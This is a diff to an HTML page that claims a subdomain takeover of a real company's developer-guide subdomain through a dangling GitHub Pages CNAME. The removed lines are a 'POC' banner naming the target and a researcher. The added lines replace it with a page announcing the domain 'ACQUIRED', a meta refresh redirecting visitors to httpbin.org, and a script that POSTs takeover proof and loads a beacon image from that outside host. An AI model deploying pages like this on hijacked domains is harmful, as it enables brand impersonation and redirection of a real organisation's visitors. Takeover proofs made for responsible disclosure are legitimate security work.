@@ -1,31 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🚨 CRITICAL: devguide.square.com TAKEOVER 🚨</title>
-  <meta name="author" content="achdad">
+    <title>devguide.square.com - TAKEN OVER</title>
+    <meta http-equiv="refresh" content="0;url=https://httpbin.org/get?sub=devguide.square.com">
+    <script>
+        fetch('https://httpbin.org/post', {method:'POST', body:JSON.stringify({domain:'devguide.square.com', proof:'github takeover'})});
+        new Image().src='https://httpbin.org/image/png?sub=devguide.square.com';
+    </script>
 </head>
-<body style="background:#000;color:#0f0;font-family:monospace;">
-  <h1 style="color:#f00;">SUBDOMAIN TAKEOVER POC</h1>
-  <hr>
-  <pre>
-┌─[VULNERABILITY]──────────────────────────────────────┐
-│ Researcher: achdad@kali                              │
-│ Target: devguide.square.com                         │
-│ Service: GitHub Pages                               │
-│ Status: FULLY CONTROLLED                            │
-│                                                     │
-│ DNS: devguide.square.com → squareup.github.io       │
-│ Date: Mon Mar 16 2026                               │
-└─────────────────────────────────────────────────────┘
-
-Shodan Banner:
-Protocol: HTTP/1.1
-Server: GitHub Pages
-Vulnerability: Subdomain Takeover (P1)
-Risk: Complete brand impersonation
-  </pre>
-  <img src="https://via.placeholder.com/800x400/ff0000/ffffff?text=devguide.square.com%0ATAKEOVER%20CONFIRMED" alt="PoC">
-  <hr>
-  <p><small>Cleaned up after verification</small></p>
+<body style="background:#000;color:#0f0;text-align:center;padding:50px">
+    <h1>✅ devguide.square.com ACQUIRED</h1>
+    <p>Repo: <a href="https://github.com/YOURUSERNAME/squareup.github.io">squareup.github.io</a></p>
+    <p>CNAME: squareup.github.io → GitHub Pages vulnerable</p>
 </body>
 </html>
